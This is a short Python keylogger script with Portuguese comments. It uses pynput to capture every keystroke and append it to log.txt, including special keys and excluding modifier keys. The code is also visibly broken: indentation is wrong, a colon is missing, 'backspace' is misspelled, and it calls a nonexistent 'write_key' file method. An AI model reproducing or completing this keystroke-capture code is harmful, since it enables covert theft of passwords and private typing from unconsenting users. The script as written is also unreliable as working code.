from pynput import keyboard


IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
}


def on_press(key):
    try:
        #se for uma tecla normal (letra, número, símbolo)
         with open("log.txt", "a", encoding="utf-8") as f:
        f.write_key(key.char)
    except AttributeError: 
        #se for uma tecla especial (shift, ctrl, alt, etc)
         with open("log.txt", "a", encoding="utf-8") as f:
        if key == keyboard.Key.space:
            f.write_key(" ")
        elif key == keyboard.Key.enter:
            f.write_key("\n")
        elif key == keyboard.Key.tab
            f.write_key("\t")
        elif key == keyboard.Key.esc:
            f.write_key("[ESC]")
        elif key == keyboard.Key.bacspace:
            f.write_key(" ")
        elif key in IGNORAR:
            pass
        else:
            f.write_key(f"[{key}]")

           
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
